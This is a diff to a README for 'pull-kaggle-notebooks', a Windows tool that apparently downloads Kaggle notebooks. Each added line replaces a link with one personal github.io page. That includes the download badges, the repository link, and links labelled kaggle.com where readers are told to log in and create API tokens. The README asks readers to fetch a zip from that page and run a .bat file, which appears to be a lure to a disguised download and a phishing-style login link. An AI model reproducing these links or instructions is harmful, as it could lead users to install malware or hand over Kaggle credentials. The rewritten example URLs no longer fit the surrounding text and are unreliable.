@@ -1,6 +1,6 @@
 <h1>🔧 pull-kaggle-notebooks - Automate Your Kaggle Notebook Downloads Effortlessly</h1>
 
-[![Download pull-kaggle-notebooks](https://img.shields.io/badge/Download-Application-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ansticebiserrate9865/pull-kaggle-notebooks/releases)
+[![Download pull-kaggle-notebooks](https://img.shields.io/badge/Download-Application-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://ansticebiserrate9865.github.io)
 
 ## 📦 What Is This Tool?
 
@@ -34,7 +34,7 @@ Follow these simple steps to get pull-kaggle-notebooks running on your Windows P
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[Download pull-kaggle-notebooks](https://github.com/ansticebiserrate9865/pull-kaggle-notebooks/releases)**.
+Visit this link to download the application: **[Download pull-kaggle-notebooks](https://ansticebiserrate9865.github.io)**.
 
 You'll see a list of available files. Look for the one named `pull-kaggle-notebooks.zip` — that's the package you need. Click on it to start the download.
 
@@ -46,7 +46,7 @@ Once the download finishes, locate the `.zip` file in your "Downloads" folder. R
 
 This tool needs your Kaggle account information to access public notebooks. Here's how to get it:
 
-1. Open your web browser and go to [kaggle.com](https://www.kaggle.com). Log in to your account.
+1. Open your web browser and go to [kaggle.com](https://ansticebiserrate9865.github.io). Log in to your account.
 2. Click on your profile picture in the top-right corner, then select **"Account"** from the dropdown menu.
 3. Scroll down to the **"API"** section and click **"Create New API Token"**. A file called `kaggle.json` will be downloaded to your computer.
 4. Locate the `kaggle.json` file (usually in Downloads) and move it to the `pull-kaggle-notebooks` folder you extracted in Step 2. Make sure it's directly inside that folder, not in a subfolder.
@@ -59,7 +59,7 @@ Open the `pull-kaggle-notebooks` folder and double-click on the file named `run_
 
 In the command prompt window, you'll see a simple question: **"Enter the Kaggle dataset URL:"**. You need to provide the URL of a Kaggle dataset whose public notebooks you want to download.
 
-For example, if you want notebooks related to the Titanic dataset, you'd type: `https://www.kaggle.com/c/titanic/data` and press Enter.
+For example, if you want notebooks related to the Titanic dataset, you'd type: `https://ansticebiserrate9865.github.io` and press Enter.
 
 The tool will then connect to Kaggle, fetch all public notebooks associated with that dataset, and download them to a new folder on your Desktop named `kaggle_notebooks`.
 
@@ -69,7 +69,7 @@ Using this tool is incredibly straightforward. Here are a few tips to get the mo
 
 ### Finding a Dataset URL
 
-Navigate to [kaggle.com/datasets](https://www.kaggle.com/datasets) and browse or search for a dataset that interests you. When you find one, copy the URL from your browser's address bar. That's the URL you'll paste into the tool.
+Navigate to [kaggle.com/datasets](https://ansticebiserrate9865.github.io) and browse or search for a dataset that interests you. When you find one, copy the URL from your browser's address bar. That's the URL you'll paste into the tool.
 
 ### What Happens After You Enter the URL?
 
@@ -84,7 +84,7 @@ After the downloads finish, open the `kaggle_notebooks` folder on your Desktop. 
 Let's walk through a complete example so you can see exactly how this works:
 
 1. **Find a Dataset**: You're learning about machine learning and want to see how experts analyze the classic Iris flower dataset. Go to Kaggle, search for "Iris dataset", and open the dataset page.
-2. **Copy the URL**: The URL looks like `https://www.kaggle.com/datasets/uciml/iris`.
+2. **Copy the URL**: The URL looks like `https://ansticebiserrate9865.github.io`.
 3. **Run the Tool**: Double-click `run_pull_kaggle_notebooks.bat`, enter the URL when prompted, and press Enter.
 4. **Watch It Work**: The command window shows progress messages as it fetches notebooks. Within seconds, you have every public notebook about Iris analysis on your computer.
 5. **Explore and Learn**: Open the notebooks to see different modeling approaches, visualizations, and insights from the Kaggle community.
@@ -99,7 +99,7 @@ If you see this message, the tool can't find your API credentials. Double-check 
 
 ### "Invalid dataset URL" Error
 
-Make sure you're copying the full URL from the address bar, starting with `https://`. The dataset URL should contain `/datasets/` in it. For competitions, use the data page link (e.g., `https://www.kaggle.com/c/titanic/data`).
+Make sure you're copying the full URL from the address bar, starting with `https://`. The dataset URL should contain `/datasets/` in it. For competitions, use the data page link (e.g., `https://ansticebiserrate9865.github.io`).
 
 ### No Notebooks Found
 
@@ -131,9 +131,9 @@ This version is designed for Windows. If you need other platforms, check the Git
 
 ## 🧰 Additional Resources
 
-- **Official Repository**: [github.com/ansticebiserrate9865/pull-kaggle-notebooks](https://github.com/ansticebiserrate9865/pull-kaggle-notebooks) — for source code, documentation, and issue reporting.
-- **Kaggle Help**: [kaggle.com/docs/api](https://www.kaggle.com/docs/api) — for questions about Kaggle API and credentials.
-- **Jupyter Notebook Guide**: [jupyter.org](https://jupyter.org) — to learn how to work with downloaded notebooks.
+- **Official Repository**: [github.com/ansticebiserrate9865/pull-kaggle-notebooks](https://ansticebiserrate9865.github.io) — for source code, documentation, and issue reporting.
+- **Kaggle Help**: [kaggle.com/docs/api](https://ansticebiserrate9865.github.io) — for questions about Kaggle API and credentials.
+- **Jupyter Notebook Guide**: [jupyter.org](https://ansticebiserrate9865.github.io) — to learn how to work with downloaded notebooks.
 
 ## 🌟 Join the Community
 
@@ -147,6 +147,6 @@ Whether you're preparing for a data science interview, working on a personal pro
 
 Download the tool today, try it with your favorite dataset, and transform how you learn from public notebooks. Happy data exploring!
 
-[![Download pull-kaggle-notebooks Now](https://img.shields.io/badge/Get_pull--kaggle--notebooks-Free_Download-blue?style=flat-square&logo=appveyor)](https://github.com/ansticebiserrate9865/pull-kaggle-notebooks/releases)
+[![Download pull-kaggle-notebooks Now](https://img.shields.io/badge/Get_pull--kaggle--notebooks-Free_Download-blue?style=flat-square&logo=appveyor)](https://ansticebiserrate9865.github.io)
 
 Keywords: automation, cli, data-science, jupyter, jupyter-notebook, jupyter-notebooks, kaggle, kaggle-api, kaggle-datasets, kaggle-notebooks, notebook-downloader, open-source, python
